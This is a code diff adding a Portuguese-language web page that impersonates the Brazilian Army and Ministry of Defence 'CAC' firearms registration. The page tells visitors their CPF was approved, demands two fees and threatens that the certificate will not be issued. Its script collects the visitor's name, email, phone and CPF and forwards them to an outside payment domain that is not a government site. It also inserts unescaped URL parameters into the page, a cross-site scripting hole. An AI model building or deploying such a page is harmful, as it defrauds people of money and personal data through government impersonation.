@@ -1,0 +1,177 @@
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ministério da Defesa</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+        }
+        @keyframes moveButton {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        #payFeeButton {
+            animation: moveButton 1.5s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-white">
+    <header class="border-b">
+        <div class="container mx-auto px-4 py-2">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center">
+                    <img alt="Brazilian Army emblem showing a yellow star on a blue background with green laurel wreath" class="h-12" height="50" src="https://seeklogo.com/images/E/exercito-brasileiro-logo-C8C1AE9DE8-seeklogo.com.png" width="40"/>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <button>
+                        <i class="fas fa-ellipsis-v text-olive-600 text-xl"></i>
+                    </button>
+                    <button>
+                        <i class="fas fa-th text-olive-600 text-xl"></i>
+                    </button>
+                    <button>
+                        <i class="fas fa-search text-olive-600 text-xl"></i>
+                    </button>
+                    <button class="bg-gray-100 px-4 py-2 rounded-md">
+                        <div class="flex items-center space-x-2">
+                            <i class="fas fa-user text-olive-600"></i>
+                            <span class="text-olive-600">Entrar</span>
+                        </div>
+                    </button>
+                </div>
+            </div>
+            <div class="mt-4 flex items-center">
+                <button class="mr-4">
+                    <i class="fas fa-bars text-olive-600 text-xl"></i>
+                </button>
+                <div>
+                    <h1 class="text-2xl font-normal text-gray-700">Exército Brasileiro</h1>
+                    <h2 class="text-lg font-light text-gray-600">Conclusão do CAC</h2>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="container mx-auto px-4 py-6">
+        <div class="flex items-center text-olive-600 mb-6 text-sm whitespace-nowrap">
+            <i class="fas fa-home"></i>
+            <span class="mx-2">Exército Brasileiro</span>
+            <i class="fas fa-chevron-right mx-2"></i>
+            <span>Cadastro CAC</span>
+        </div>
+        <div class="mx-auto bg-white rounded-lg shadow-lg p-4 text-[#222222]">
+            <div id="customerInfoDiv" class="mt-[-40px] mb-2 bg-gray-50 p-2 rounded-md"></div>
+            <div class="bg-yellow-50 text-[15px] p-4 mb-6">
+                <div class="flex items-center mb-4">
+                    <h2 class="text-[15px] font-bold text-[#856504]">Prezado, <span id="firstName"></span>:</h2>
+                </div>
+                <p class="text-[15px] text-[#856504] leading-relaxed">
+                    O CPF <strong id="cpfDisplay"></strong> foi verificado e seu Registro CAC foi aprovado. Para concluir o processo é necessário efetuar o pagamento das seguintes taxas:
+                </p>
+                <ul class="list-disc pl-5 mt-3 text-[#856504]">
+                    <li>Taxa de aquisição de armas e munições: <strong>R$131,50</strong></li>
+                    <li>Taxa de fiscalização de produtos controlados (TFPC) para transporte de armas e munições: <strong>R$112,18</strong></li>
+                </ul>
+            </div>
+            <div class="movements">
+                <div class="relative pl-8 pb-4 border-l-4 border-red-50">
+                    <div class="absolute left-0 top-0 w-6 h-6 bg-red-50 rounded-full -ml-3 flex items-center justify-center">
+                        <i class="fas fa-exclamation-triangle text-red-600 text-xs"></i>
+                    </div>
+                    <div class="mb-8"></div>
+                    <div class="-ml-3 flex items-center justify-center">
+                        <i class=""></i>
+                    </div>
+                    <div class="mb-8">
+                        <p class="font-semibold text-red-600 text-2sm">AGUARDANDO PAGAMENTO</p>
+                        <p id="current-date" class="text-[12px] text-gray-600 mt-1"></p>
+                        <div class="mt-4 bg-red-50 text-red-700 p-4 rounded-md" role="alert">
+                            <p class="mt-1">O não pagamento das taxas resultará na <strong>não emissão do Certificado CAC</strong>, impossibilitando a compra e registro de armamento.</p>
+                        </div>
+                        <button id="payFeeButton" class="mt-4 bg-red-500 text-white px-8 py-3 rounded-[4px] hover:bg-olive-800 text-white font-bold py-2 px-6 rounded-[4px] hover:bg-red-700 transition duration-300 shadow-md">
+                            CONCLUIR CADASTRO
+                        </button>
+                    </div>
+                </div>
+                <div class="mt-8 bg-olive-600 p-4 rounded-[4px] border-l-4 border-olive-700">
+                    <p class="font-semibold text-white text-lg"><i class="fas fa-certificate mr-2 text-olive-700"></i>Próxima Etapa:</p>
+                    <p class="mt-2 text-white">Após o pagamento das taxas, seu Certificado CAC será emitido e enviado para o seu endereço. <span class="font-medium"></span></p>
+                </div>
+            </div>
+            <a href="index.html" class="inline-block mt-8 text-[#226B00] hover:underline">
+                <i class="fas fa-arrow-left mr-2"></i>Voltar
+            </a>
+        </div>
+    </main>
+    <footer class="bg-gray-800 text-white mt-16 py-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-wrap justify-between">
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-xl font-bold mb-2">Ministério da Defesa</h3>
+                    <p>Protegendo e servindo o Brasil.</p>
+                </div>
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-xl font-bold mb-2">Links Úteis</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-gray-300">Serviços</a></li>
+                        <li><a href="#" class="hover:text-gray-300">Publicações</a></li>
+                        <li><a href="#" class="hover:text-gray-300">Contato</a></li>
+                    </ul>
+                </div>
+                <div class="w-full md:w-1/3">
+                    <h3 class="text-xl font-bold mb-2">Contato</h3>
+                    <p>Esplanada dos Ministérios, Bloco Q</p>
+                    <p>Brasília - DF, 70049-900</p>
+                </div>
+            </div>
+            <div class="mt-8 text-center">
+                <p>&copy; 2024 Ministério da Defesa. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = decodeURIComponent(urlParams.get('name')) || 'Nome não disponível';
+        const address = decodeURIComponent(urlParams.get('address')) || 'Endereço não disponível';
+        const email = decodeURIComponent(urlParams.get('email')) || 'Email não disponível';
+        const telephone = decodeURIComponent(urlParams.get('telephone')) || 'Telefone não disponível';
+        const documentId = decodeURIComponent(urlParams.get('document')) || 'Documento não disponível';
+        const error = decodeURIComponent(urlParams.get('error')) || null;
+
+        const cpf = sessionStorage.getItem('cpf') || 'CPF não encontrado';
+
+        // Injecting customer info
+        const customerInfoDiv = document.getElementById('customerInfoDiv');
+        customerInfoDiv.innerHTML = `
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Nome:</strong> ${name}</p>
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Email:</strong> ${email}</p>
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">Telefone:</strong> ${telephone}</p>
+            <p class="mb-2"><strong class="font-medium text-[#226B00]">CPF:</strong> ${cpf}</p>
+        `;
+
+        // Injecting CPF into attention section
+        const firstNameSpan = document.getElementById('firstName');
+        firstNameSpan.textContent = name.split(' ')[0];
+        document.getElementById('cpfDisplay').textContent = cpf;
+
+        // Set current date
+        const currentDateElement = document.getElementById('current-date');
+        const currentDate = new Date();
+        const formattedDate = `${currentDate.getDate().toString().padStart(2, '0')}/${(currentDate.getMonth() + 1).toString().padStart(2, '0')}/${currentDate.getFullYear()}`;
+        currentDateElement.textContent = formattedDate;
+
+        // Payment button functionality
+        const payFeeButton = document.getElementById('payFeeButton');
+
+        // Construct the URL for the payment page
+        const pagSeguroUrl = `https://pay.pagamentoregistrocac.online/kYL6ge6pOpY3rKM?name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}&telephone=${encodeURIComponent(telephone)}&document=${encodeURIComponent(cpf)}`;
+
+        payFeeButton.addEventListener('click', function() {
+            window.location.href = pagSeguroUrl;
+        });
+    </script>
+</body>
+</html>
